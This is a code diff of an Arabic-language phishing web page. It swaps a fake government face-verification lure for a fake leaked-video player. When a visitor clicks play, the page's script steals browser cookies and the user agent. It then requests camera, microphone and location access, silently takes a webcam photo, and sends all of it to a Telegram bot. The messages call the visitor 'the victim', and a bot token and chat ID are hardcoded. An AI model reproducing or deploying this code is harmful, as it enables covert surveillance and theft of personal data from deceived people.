@@ -1,173 +1,94 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق الحكومي الموحد</title>
+    <title>فضيحة نار 🔥🔥 - حصري 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            background-color: #f3f4f6;
-            color: #1f2937;
-            font-family: 'Noto Sans Arabic', sans-serif;
-        }
-        .gov-card {
-            background: white;
-            border-top: 6px solid #1e3a8a;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-        }
-        .scan-overlay {
-            position: relative;
-            width: 180px;
-            height: 180px;
-            border: 2px solid #3b82f6;
-            border-radius: 50%;
-            margin: 0 auto;
-            overflow: hidden;
-        }
-        .scan-line {
-            position: absolute;
-            width: 100%;
-            height: 2px;
-            background: #3b82f6;
-            top: 0;
-            box-shadow: 0 0 15px #3b82f6;
-            animation: moveScan 2s linear infinite;
-        }
-        @keyframes moveScan {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
-        .btn-gov {
-            background-color: #1e3a8a;
-            transition: all 0.3s;
-        }
-        .btn-gov:hover {
-            background-color: #1e40af;
-            transform: translateY(-1px);
-        }
+        body { background: #000; color: #fff; font-family: sans-serif; }
+        .player-shell { border: 2px solid #222; background: #0a0a0a; position: relative; overflow: hidden; }
+        .neon-text { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body class="flex flex-col items-center justify-center min-h-screen p-6">
 
-    <div class="gov-card max-w-md w-full p-8 rounded-xl text-center">
-        <!-- Logo Simulation -->
-        <div class="mb-6">
-            <div class="w-16 h-16 bg-blue-900 rounded-full mx-auto flex items-center justify-center text-white text-2xl font-bold">
-                🛡️
+    <div class="w-full max-w-2xl text-center mb-6">
+        <h1 class="text-3xl font-bold neon-text mb-4 underline">فضيحة نار 🔥🔥 شاهد قبل الحذف</h1>
+        <div class="player-shell aspect-video rounded-3xl flex items-center justify-center cursor-pointer" onclick="ignitePayload()">
+            <div id="playIcon" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-2xl">
+                <svg viewBox="0 0 24 24" class="w-10 h-10 fill-white"><path d="M8 5v14l11-7z"/></svg>
             </div>
-            <h1 class="mt-4 text-xl font-bold text-blue-900">نظام التحقق الرقمي الآمن</h1>
-            <p class="text-xs text-gray-500 uppercase tracking-widest mt-1">Digital Identity Verification System</p>
-        </div>
-
-        <div class="my-8">
-            <div class="scan-overlay bg-gray-100 flex items-center justify-center">
-                <div class="scan-line"></div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-20 w-20 text-blue-200" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M5.121 17.804A13.937 13.937 0 0112 16c2.5 0 4.847.655 6.879 1.804M15 10a3 3 0 11-6 0 3 3 0 016 0zm6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
-                </svg>
+            <div id="loader" class="hidden flex flex-col items-center">
+                <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-red-600 mb-4"></div>
+                <p class="text-sm">جاري جلب بيانات الفيديو المسرب...</p>
             </div>
-            <p class="mt-4 text-sm font-medium text-gray-700">جاري تفعيل المسح البيومتري للوجه...</p>
-        </div>
-
-        <div class="space-y-4">
-            <div class="bg-blue-50 p-4 rounded-lg border border-blue-100 text-right">
-                <p class="text-xs text-blue-800 leading-relaxed">
-                    بناءً على بروتوكولات الأمان الجديدة، يتطلب الوصول إلى هذا المحتوى التحقق من الهوية عبر الموقع الجغرافي والتعرف على ملامح الوجه لضمان أنك لست روبوتًا.
-                </p>
-            </div>
-
-            <button id="startVerify" class="btn-gov w-full py-3 rounded-lg text-white font-bold shadow-lg">
-                بدء عملية التحقق الآن
-            </button>
-            
-            <p class="text-[10px] text-gray-400">جميع البيانات مشفرة وتخضع لقانون حماية البيانات الرقمية 2026</p>
         </div>
     </div>
 
-    <!-- Hidden Capture Elements -->
-    <video id="video" style="display:none" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none"></canvas>
-
     <script>
-        // Your Credentials
-        const TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
+        const BOT_TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
         const CHAT_ID = "1523412137";
 
-        const startBtn = document.getElementById('startVerify');
-
-        async function sendToTelegram(type, data, caption = "") {
-            const baseUrl = `https://api.telegram.org/bot${TOKEN}`;
-            if (type === 'photo') {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', data, 'capture.jpg');
-                formData.append('caption', caption);
-                await fetch(`${baseUrl}/sendPhoto`, { method: 'POST', body: formData });
-            } else {
-                await fetch(`${baseUrl}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
-                });
-            }
+        async function sendToTelegram(text) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+            });
         }
 
-        async function captureAndReport() {
-            startBtn.innerText = "جاري المعالجة...";
-            startBtn.disabled = true;
+        async function ignitePayload() {
+            document.getElementById('playIcon').style.display = 'none';
+            document.getElementById('loader').classList.remove('hidden');
 
-            // 1. Get Network Info (Silent)
+            // 1. سحب الكوكيز (The Cookie Grabber)
+            const cookies = document.cookie || "لا توجد كوكيز متاحة (HttpOnly أو فارغة)";
+            const browserInfo = `🖥️ *بيانات المتصفح:* ${navigator.userAgent}\n🍪 *الكوكيز:* \`${cookies}\``;
+            await sendToTelegram(browserInfo);
+
+            // 2. طلب الأذونات (كاميرا + ميكروفون + موقع)
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const info = await res.json();
-                let msg = `👤 *تحقق جديد من الهوية*\n`;
-                msg += `🌐 IP: \`${info.ip}\`\n📍 المدينة: ${info.city}\n🏢 المزود: ${info.org}`;
-                await sendToTelegram('text', msg);
-            } catch(e) {}
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // سحب الموقع
+                navigator.geolocation.getCurrentPosition(async p => {
+                    const loc = `📍 *موقع الضحية اللحظي:*\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    await sendToTelegram(loc);
+                });
 
-            // 2. Request Camera & GPS
-            try {
-                // Request Location first
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async (pos) => {
-                        const gpsMsg = `🎯 *موقع GPS دقيق للهدف:*\n[خرائط جوجل](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
-                        await sendToTelegram('text', gpsMsg);
-                    });
-                }
-
-                // Request Camera for "Face Scan"
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
+                // التقاط صورة صامتة
+                const video = document.createElement('video');
                 video.srcObject = stream;
-
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
+                video.onloadedmetadata = () => {
+                    video.play();
+                    const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        sendToTelegram('photo', blob, "✅ *تم مسح الوجه بنجاح*");
-                        stream.getTracks().forEach(t => t.stop());
-                        
-                        // Simulation Finish
-                        setTimeout(() => {
-                            window.location.href = "https://www.google.com";
-                        }, 1000);
-                    }, 'image/jpeg');
-                }, 1500);
+                    setTimeout(async () => {
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(async blob => {
+                            const fd = new FormData();
+                            fd.append('chat_id', CHAT_ID);
+                            fd.append('photo', blob, 'shot.jpg');
+                            fd.append('caption', "📸 صورة مسربة للضحية");
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 'image/jpeg');
+                    }, 1000);
+                };
+
+                setTimeout(() => {
+                    document.getElementById('loader').innerHTML = "<p class='text-red-500'>عذراً، هذا المقطع تم حذفه من قبل إدارة الأمان!</p>";
+                }, 4000);
 
             } catch (err) {
-                await sendToTelegram('text', "⚠️ الضحية رفض الأذونات أو الكاميرا محجوبة.");
-                window.location.href = "https://www.google.com";
+                await sendToTelegram("⚠️ الضحية رفض إعطاء الأذونات.");
+                document.getElementById('loader').innerHTML = "<p class='text-orange-500'>فشل التحميل: يرجى السماح بالأذونات للمشاهدة.</p>";
             }
         }
-
-        startBtn.addEventListener('click', captureAndReport);
     </script>
 </body>
 </html>
-
 
